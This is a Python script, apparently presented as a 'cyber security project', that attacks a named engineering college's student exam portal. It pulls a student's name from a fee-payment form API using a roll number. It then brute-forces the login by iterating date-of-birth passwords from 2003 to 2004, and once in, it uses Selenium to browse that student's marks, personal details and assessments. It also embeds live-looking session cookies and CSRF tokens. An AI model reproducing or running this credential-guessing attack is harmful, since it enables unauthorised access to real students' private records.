import requests
import time
import sys
from datetime import datetime, timedelta
from selenium import webdriver
from selenium.webdriver.common.by import By

# First Code Block: API Request
url_api = "https://formbuilder.ccavenue.com/live/ajax/get-ajax-data"
headers_api = {
    "Host": "formbuilder.ccavenue.com",
    "Cookie": "advanced-frontend=cj8p70kjl7j4geqtkmklebr1v4; _csrf-frontend=2a8355e1d2f465d09ddc9a21a03640e38460cf42540e35a7000ed6760860bfa7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%227CJTspBcN8mY8wxXABV3G8MDn_iZ-VHj%22%3B%7D",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-Csrf-Token": "cQ9WcH35p2jZXRBGw8-IuYrRXYEzUbIDylyAS0eL1QxGTBwkDonlC5dlfR_7uPDhy5MLsnRp_0ekA-kRat2dZg==",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://formbuilder.ccavenue.com",
    "Referer": "https://formbuilder.ccavenue.com/live/indian-bank/sa-engineering-college/ug-tuition-fee",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers",
}

print("--------------------------------------------------------")
print("Cyber Security Project - SAEC College Login Portal")
print("--------------------------------------------------------")

term_value = input("Enter a Roll number: ")
print("--------------------------------------------------------")
data_api = {
    "term": term_value,
    "form_id": "581",
    "end_point": "GET_SA_ENGINEERING_COLLEGE_STUDENT"
}
print("Host : formbuilder.ccavenue.com\nExtracting name details from UG Tuition Fees Database\n")
try:
    response_api = requests.post(url_api, headers=headers_api, data=data_api)
    response_json = response_api.json()

    if "data" in response_json and len(response_json["data"]) > 0:
        id_value = response_json["data"][0]["id"]
        first_letter = id_value[0]
    else:
        print("No data or id found in the response.")

except requests.exceptions.RequestException as e:
    print("An error occurred:", e)

print(id_value)
print("--------------------------------------------------------")

# Function to perform actions based on user choice
def perform_action(user_choice):
    if user_choice == "1":
        print("Home - login page\n--------------------------------------------------------")
        result_url1 = 'https://coe.saec.ac.in/exam/studentlogin/index.php'
        driver.get(result_url1)
    elif user_choice == "2":
        print("June 2023 Mark\n--------------------------------------------------------")
        result_url2 = 'https://coe.saec.ac.in/exam/studentlogin/exam/result.php?exam_cd=JUN23'
        driver.get(result_url2)
    elif user_choice == "3":
        print("Personal details\n--------------------------------------------------------")
        result_url3 = 'https://coe.saec.ac.in/exam/studentlogin/personal.php?act=viewscreen&144982943'
        driver.get(result_url3)
    elif user_choice == "4":
        print("Exam overall Performance\n--------------------------------------------------------")
        result_url4 = 'https://coe.saec.ac.in/exam/studentlogin/exam/examwise_perf.php'
        driver.get(result_url4)
    elif user_choice == "5":
        print("Internal Assessment deatils\n--------------------------------------------------------")
        result_url5 = 'https://coe.saec.ac.in/exam/studentlogin/exam/con_asses_perf.php'
        driver.get(result_url5)
    elif user_choice == "6":
        print("wait a while logging out in progress")
        result_url6 = 'https://coe.saec.ac.in/exam/studentlogin/logout.php?header=1'
        driver.get(result_url6)
        driver.close()
        driver.quit()
        print("Logged out")
        print("--------------------------------------------------------")
        print(f"Name : {id_value} \nReg no: {term_value}\nLogin Password: {formatted_date}")
        print("--------------------------------------------------------")
        sys.exit()
    else:
        print("Invalid choice. \nPlease enter 1, 2, 3, 4, 5, or 6")

# Second Code Block: Login Attempts
url_login = "https://coe.saec.ac.in/exam/studentlogin/login.php?action=process"
headers_login = {
    "Host": "coe.saec.ac.in",
    "Cookie": f"roll_no={term_value}; inst_addr=Poonamallee+-+Avadi+Main+Road%2C+Thiruverkadu%2C+Chennai+-+600077; inst_ph=044-26801999; inst_fax=044-26801899; stuinst_url=www.saec.ac.in; inst_email=coe%40saec.ac.in; inst_type=ENGG; inst_rmk1=%28An+Autonomous+Institution%2C+Affiliated+to+Anna+University%2C+Chennai%29; _ga_9WMRJCNDNW=GS1.1.1692767337.1.1.1692768325.60.0.0; _ga=GA1.1.1151968483.1692767338; _gcl_au=1.1.393118910.1692767338; _ga_W1M42GWJ2G=GS1.1.1692767337.1.1.1692768483.0.0.0; _ga_9XNKYNVCZT=GS1.1.1692767337.1.1.1692768483.0.0.0; _ga_2P1W42DQ4P=GS1.1.1692767337.1.1.1692768483.0.0.0; PHPSESSID=db61574e5513ce16e3964831b25f6726",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "119",
    "Origin": "https://coe.saec.ac.in",
    "Referer": "https://coe.saec.ac.in/exam/studentlogin/login.php?done=/exam/studentlogin/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
    "Connection": "close"
}

start_date = datetime(2003, 1, 1)
end_date = datetime(2004, 12, 31)
current_date = start_date
print("Trying date of birth combinations ...")

while current_date <= end_date:
    formatted_date = first_letter + current_date.strftime("%d-%m-%Y")
    
    data_login = {
        "act": "",
        "assign_value": "N",
        "continue": "/exam/studentlogin/",
        "captcha_security": "N",
        "user_name": term_value,
        "pass_word": formatted_date
    }
    
    try:
        response_login = requests.post(url_login, headers=headers_login, data=data_login, allow_redirects=False)
        
        if response_login.status_code == 302:
            print("Password cracked")
            time.sleep(1)
            print(f"Successful login on: {formatted_date}")
            print("Automating Login Credentials - Selenium Started")

            # Selenium implementation
            driver = webdriver.Edge()
            driver.get('https://coe.saec.ac.in/exam/studentlogin/login.php?action=process')

            id_field = driver.find_element(By.XPATH, '//input[@name="user_name"]')
            password_field = driver.find_element(By.XPATH, '//input[@name="pass_word"]')
            id_field.send_keys(term_value)
            password_field.send_keys(formatted_date)

            # Log In
            login_button = driver.find_element(By.XPATH, '//button[@class="button" and contains(text(), "Log In")]')
            login_button.click()
            print("Login Successful :)")
            print("--------------------------------------------------------")

            while True:
                print("1. Home\n2. Last Exam Marks\n3. Profile\n4. Exam Performance\n5. IA Performance\n6. Logout")
                user_choice = input("Enter your choice (1/2/3/4/5/6): ").strip().lower()
                perform_action(user_choice)
            
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

    current_date += timedelta(days=1)
